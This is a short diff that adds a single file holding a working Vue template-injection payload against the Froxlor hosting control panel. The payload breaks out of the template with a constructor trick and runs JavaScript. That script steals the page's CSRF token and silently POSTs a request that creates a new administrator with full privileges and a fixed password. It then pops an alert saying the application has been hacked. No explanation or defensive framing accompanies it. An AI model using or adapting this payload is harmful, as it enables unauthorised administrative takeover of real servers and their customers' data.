@@ -1,0 +1,11 @@
+admin{{$emit.constructor`function b(){
+var metaTag=document.querySelector('meta[name="csrf-token"]')
+var csrfToken=metaTag.getAttribute('content')
+var xhr=new XMLHttpRequest()
+var url="/admin_admins.php"
+var params="new_loginname=abcd&admin_password=Abcd@@1234&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=Abcd&email=yldrmtest@gmail.com&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token=" csrfToken "&page=admins&action=add&send=send"
+xhr.open("POST",url,true)
+xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")
+alert("Your Froxlor Application has been completely Hacked")
+xhr.send(params)}
+a=b()`()}}
